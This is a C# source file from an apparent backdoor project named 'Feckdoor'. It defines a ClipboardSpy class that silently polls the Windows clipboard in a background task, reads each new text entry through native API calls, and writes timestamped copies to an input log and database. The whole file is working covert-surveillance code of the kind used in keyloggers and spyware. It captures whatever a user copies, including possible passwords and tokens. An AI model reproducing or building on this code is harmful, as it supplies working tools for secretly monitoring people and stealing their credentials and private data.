using Serilog;
using System.Text;

namespace Feckdoor.InputLog
{
	public class ClipboardSpy : IDisposable
	{
		protected readonly CancellationTokenSource cancel;

		private int PrevSequenceNum = 0;
		private bool disposed;

		public ClipboardSpy()
		{
			cancel = new CancellationTokenSource();
			Task.Run(async () => await ClipboardSpyProc(cancel.Token));
		}

		private async Task ClipboardSpyProc(CancellationToken ct)
		{
			while (!ct.IsCancellationRequested)
			{
				int newSeqNum = User32.GetClipboardSequenceNumber();
				if (PrevSequenceNum != newSeqNum)
				{
					string? Data = GetClipboardDataNative();
					if (Data != null)
					{
						if (Data.Length > 100)
							Data = Data[..100] + " (truncated)";
						InputLogWriter.Push(new ClipboardChangeEntry(DateTime.Now, Data));
					}
				}
				PrevSequenceNum = newSeqNum;
				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay, ct);
			}
		}

		private static unsafe string? GetClipboardDataNative()
		{
			try
			{
				User32.OpenClipboard(IntPtr.Zero);
				uint filter = User32.CF_UNICODETEXT;

				if (User32.GetPriorityClipboardFormat(&filter, 1) == User32.CF_UNICODETEXT)
				{
					IntPtr clipHandle = User32.GetClipboardData(User32.CF_UNICODETEXT);
					string? clipString = null;
					if (clipHandle != IntPtr.Zero)
					{
						try
						{
							clipString = new string((char*)Kernel32.GlobalLock(clipHandle));
						}
						finally
						{
							Kernel32.GlobalUnlock(clipHandle);
						}
					}
					return clipString;
				}
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during native clipboard access.");
			}
			finally
			{
				try
				{
					User32.CloseClipboard();
				}
				catch (Exception e)
				{
					Log.Error(e, "Exception during closing the clipboard.");
				}
			}

			return null;
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposed)
			{
				cancel.Cancel();
				disposed = true;
			}
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}

	internal class ClipboardChangeEntry : InputLogEntry
	{
		private readonly string Clipboard;

		public override string PlainTextMessage
		{
			get
			{
				var sb = new StringBuilder();
				sb.AppendLine(Environment.NewLine);
				sb.AppendLine("##### Clipboard change #####");
				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
				sb.Append("Data: \"").Append(Clipboard).AppendLine("\"");
				sb.AppendLine("##### Clipboard change #####");
				return sb.ToString();
			}
		}

		public override object[] DbMessage
		{
			get => new object[] { Clipboard };
		}

		public ClipboardChangeEntry(DateTime timeStamp, string clipboard) : base(timeStamp)
		{
			Clipboard = clipboard;
		}
	}
}
